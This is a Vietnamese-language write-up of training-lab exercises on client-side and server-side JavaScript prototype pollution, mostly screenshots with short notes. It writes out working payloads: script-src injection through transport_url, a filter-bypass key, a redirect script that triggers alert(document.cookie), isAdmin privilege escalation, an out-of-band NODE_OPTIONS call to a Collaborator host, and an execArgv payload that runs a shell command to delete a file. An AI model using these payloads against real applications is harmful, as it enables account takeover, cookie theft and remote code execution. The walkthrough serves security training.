<img width="1202" height="677" alt="image" src="https://github.com/user-attachments/assets/c55b3cc2-5f6b-4d77-82aa-23ed21252001" />

Gán param test prototype vào trong thử thách 

<img width="1706" height="588" alt="image" src="https://github.com/user-attachments/assets/b967d307-af7c-481a-bd50-dc55f5280003" />

<img width="1426" height="541" alt="image" src="https://github.com/user-attachments/assets/580daa5c-af24-4918-9f7f-0639536620fb" />

Nhìn vào source thấy có thể thao túng thuộc tính src của script 

Test kiểm chứng lại 

<img width="1437" height="592" alt="image" src="https://github.com/user-attachments/assets/28e275f5-72b2-47b3-bc2c-2739754774da" />

Payload cuối <code>?__proto__[transport_url]=data:,alert(1);

<img width="1916" height="805" alt="image" src="https://github.com/user-attachments/assets/98c5f6c2-4b5b-4e8f-b502-e7b068c0709c" />

<img width="1187" height="568" alt="image" src="https://github.com/user-attachments/assets/baec805a-16a1-4c74-9909-56755e132d67" />

Dùng DOM Invader quét ra sources của máy chủ có thể bị tấn công theo 2 phương thức sau

<img width="1917" height="1040" alt="image" src="https://github.com/user-attachments/assets/dbc7a9ff-18f3-498e-ae76-0d5f01455c07" />

Mò vào sources thấy hàm searchLogger với thuộc tính src trong script có thể bị thao túng để chèn vào mã độc 

<img width="1917" height="475" alt="image" src="https://github.com/user-attachments/assets/b3f97903-e58a-41fc-8488-825982f049bc" />

Payload cuối <code>__proto__[transport_url]=data:,alert(1)

<img width="1910" height="783" alt="image" src="https://github.com/user-attachments/assets/05c3dbac-3871-40f6-ac98-a52ef73da4b7" />

<img width="1258" height="683" alt="image" src="https://github.com/user-attachments/assets/c3cdb69c-708d-4635-ae7e-0cca2f9cf4a7" />

Sau khi DOM Invader quét và khai thác thì sự kiện alert() không được kích hoạt

<img width="1348" height="446" alt="image" src="https://github.com/user-attachments/assets/4c9b4de9-85f4-4d8b-bf5e-ca2e39a1fab3" />

Nhìn vào source thấy param khi thêm vào sẽ được thêm 1 vào cuối và khiến payload bị vô hiệu, lúc này cần thêm dấu - vào để biến biểu thức thành một phép tính hợp lệ. Hàm sẽ thực hiện việc gọi alert() trước để lấy giá trị (thường là undefined) và thực hiện biểu thực undefined + 1 

<img width="1917" height="827" alt="image" src="https://github.com/user-attachments/assets/79e9fed3-2fb8-4f0e-bcd5-dc85ecf78495" />

<img width="1136" height="632" alt="image" src="https://github.com/user-attachments/assets/912cd2c4-c50b-4804-a391-a105a62c984f" />

Máy chủ đã đặt các khóa phổ biến vào blacklist, nếu ghi chúng vào máy chủ sẽ tự động xóa 

<img width="606" height="210" alt="image" src="https://github.com/user-attachments/assets/b82200a0-50e9-41aa-80a9-db7d5a448c25" />

Tuy nhiên nó chỉ có thể xóa 1 lần nên có thể dùng payload sau để khi máy chủ xóa proto hoàn chỉnh thì vẫn có proto bị tách ra 

    __pro__proto__to__[gadget]=payload

<img width="1917" height="902" alt="image" src="https://github.com/user-attachments/assets/1ed1b88e-83d0-4f45-9981-080c949fe124" />

<img width="1295" height="765" alt="image" src="https://github.com/user-attachments/assets/3e5ab0cc-aa08-4f47-9759-94c62d140da4" />

<img width="1267" height="686" alt="image" src="https://github.com/user-attachments/assets/84995d6a-09f7-498f-9936-89251d81cf1f" />

Dùng Dom Invader quét và khai thác xác định được thuộc tính hitCallback có thể dùng để thao túng và thêm vào payload độc hại

<img width="1917" height="721" alt="image" src="https://github.com/user-attachments/assets/ae7a3aa9-b19a-4fe6-8661-0c718d3b7ce8" />

Trong exploit server, viết đoạn payload để in ra chuyển hướng đến nạn nhân

    <script>location="https://0ab200740425a02e80ba6755004d0097.web-security-academy.net/#__proto__[hitCallback]=alert(document.cookie)"</script>

<img width="1916" height="671" alt="image" src="https://github.com/user-attachments/assets/93765448-6de2-44f0-84bc-4eb88e376267" />

<img width="1171" height="712" alt="image" src="https://github.com/user-attachments/assets/b0bd4600-7931-4e6a-bdfd-f2a4e71d672c" />

Đăng nhập vào trang web, trong phần my-account có phần thay đổi địa chỉ, bấm vào và xem history trả về

<img width="1917" height="925" alt="image" src="https://github.com/user-attachments/assets/e9605e97-9bf0-406a-913d-367a66d101dd" />

Có thể suy đoán việc thay đổi các tiện tính thông qua /change-address, kiểm tra với payload cơ bản như tài liệu đề cập

<img width="1912" height="738" alt="image" src="https://github.com/user-attachments/assets/7a18dd52-e02f-44f8-9376-385b0cb51f31" />

Có thể thấy "foo":"bar" đã được thêm vào, nhìn bên trên thấy rằng "isAdmin" đang để là false, thêm tiện ích đấy vào và thay đổi nó thành true

<img width="1917" height="761" alt="image" src="https://github.com/user-attachments/assets/c76e1257-a230-4cfc-b3c7-db35c5f7c26c" />

F5 và xóa user carlos

<img width="1917" height="956" alt="image" src="https://github.com/user-attachments/assets/85ed57f8-addf-49b1-9fb1-8a0fd69cead5" />

<img width="1283" height="855" alt="image" src="https://github.com/user-attachments/assets/1b4f8682-ec8c-4e43-85b1-b08f362e85de" />

Giống với thử thách trước, có thể thao túng tiện ích qua /change-address tuy nhiên ở thử thách này chỉ để tập cách phát hiện ra lỗi mà không được phản hồi

Gắn payload đầu với foo được encode bằng UTF-7, máy chủ không dùng mã hóa này nên nó sẽ được giữ nguyên

<img width="1916" height="756" alt="image" src="https://github.com/user-attachments/assets/ba1dcff2-922a-4613-ac62-72bfa3a53080" />

Payload sau dùng nguyên mẫu 'content-type' chỉ định kí tự UTF-7 để giải mã đoạn đã được mã hóa trước đó 

<img width="1917" height="766" alt="image" src="https://github.com/user-attachments/assets/60f43195-c9c7-4956-ba31-244909577e24" />

<img width="1917" height="848" alt="image" src="https://github.com/user-attachments/assets/d88933c4-b4c6-4921-acc8-178c9d3925ce" />

<img width="1276" height="762" alt="image" src="https://github.com/user-attachments/assets/b4fab5a9-5832-4b01-bea9-b697d93cec66" />

<img width="1692" height="566" alt="image" src="https://github.com/user-attachments/assets/842bc92a-a318-4940-9981-8540461fe41e" />

Bài này có 1 hàm để kiểm tra việc payload đầu vào nếu chứa __ sẽ tự động thành blank space và viết liền vào cho nên việc sử dụng các payload cũ là không thể. 

Sau 1 lúc ngồi mày mò không ra tôi xem solution thấy tác giả thêm thuộc tính "json spaces":10. Việc này nhằm thụt lề định dạng json, tránh bị ảnh hưởng bởi filter 

<img width="1917" height="946" alt="image" src="https://github.com/user-attachments/assets/78f0fb38-b09c-4fdc-b1fa-637e91ec8e76" />

Sửa đổi để lây nhiễm thuộc tính constructor 

<img width="1917" height="971" alt="image" src="https://github.com/user-attachments/assets/54afef36-90e4-4e3b-8d5c-4c61f85a3580" />

        "constructor": {
            "prototype": {
                "json spaces":10
        }
    }

Nhìn vào raw có thể thấy các thuộc tính đã tách nhau ra 1 khoảng, cho thấy đã làm sai lệch nguyên mẫu thành công. Thêm thuộc tính isAdmin và đổi nó thành true rồi xóa user carlos 

<img width="1917" height="1078" alt="image" src="https://github.com/user-attachments/assets/b8c0dfd5-40a2-4c97-9ff9-799d917587aa" />

<img width="1917" height="938" alt="image" src="https://github.com/user-attachments/assets/b4a6ce7d-4603-4408-a213-2cc10df13bf2" />

<img width="1248" height="806" alt="image" src="https://github.com/user-attachments/assets/9905f043-0f05-4203-8bbf-56a5038266ec" />

Máy chủ có 1 nút tác vụ bảo trì, dùng để xóa db và fs khi được kích hoạt. Đầu tiên gửi một shell tùy chọn kết hợp với một thuộc tính độc hại được gắn link của Burp Collab để truyền nhiễm 

        "__proto__": {
            "shell":"node",
            "NODE_OPTIONS":"--inspect=YOUR-COLLABORATOR-ID.oastify.com\"\".oastify\"\".com"
        }

<img width="1917" height="892" alt="image" src="https://github.com/user-attachments/assets/1460f7db-7a7f-4509-aee0-e3a0f6f7c2b1" />

Nhìn vào thì máy chủ đang bị lỗi nhưng đó là do nó đã được chuyển hướng hết sang Burp Collab

<img width="1917" height="812" alt="image" src="https://github.com/user-attachments/assets/3cb0839e-42c3-45da-8635-07007aeeef16" />

Thay thuộc tính mới vào để thực hiện việc xóa file morale.txt

        "__proto__": {
            "execArgv":[
                "--eval=require('child_process').execSync('rm /home/carlos/morale.txt')"
            ]
        }

<img width="1917" height="1061" alt="image" src="https://github.com/user-attachments/assets/67453f3b-2e71-4831-8055-0bfd936ed3e0" />
